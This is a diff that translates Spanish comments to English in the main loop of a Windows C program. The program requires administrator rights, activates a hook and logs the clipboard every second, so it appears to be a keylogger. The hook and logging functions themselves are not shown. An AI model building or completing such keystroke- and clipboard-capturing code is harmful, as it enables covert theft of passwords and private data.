@@ -18,7 +18,7 @@
 
 #pragma region "Variables"
 
-	// Aqui van las variables, si las hay
+	// Variables go here, if any
 
 #pragma endregion
 
@@ -44,24 +44,24 @@
 #pragma region "Main"
 
 	int main(void) {
-		// check if it has administrator privileges
+		// Check for administrator privileges
 		if (!IsAdmin()) return (printf("\nAdministrator privileges are required\n"), 1);
 		
-		// Activar el hook
+		// Activate the hook
 		if (!ActivateHook()) {
 			return 1;
 		}
 		
-		// Loop principal para manterner el hook activo
+		// Main loop to keep the hook active
 		MSG msg;
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");
 
-		// Para controlar el tiempo del chequeo del portapapeles (tiempo en ms desde que incio windows)
+		// To control the interval for clipboard checking (time in ms since Windows startup)
 		DWORD lastClipboardCheck = GetTickCount();
 		
 		while(TRUE)
 		{
-			// Procesar mensajes (incluyendo eventos del hook)
+			// Process messages (including hook events)
 			while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
 				if (msg.message == WM_QUIT) {
 					break;
@@ -74,10 +74,10 @@
 				break;
 			}
 
-			// Comprobar el portapapeles cada 1000 ms (1 segundo)
+			// Check clipboard every 1000 ms (1 second)
 			if (GetTickCount() - lastClipboardCheck > 1000) {
 				LogClipboardIfChanged();
-				lastClipboardCheck = GetTickCount(); // Reiniciamos contador
+				lastClipboardCheck = GetTickCount(); // Reset counter
 			}
 
 			Sleep(10);
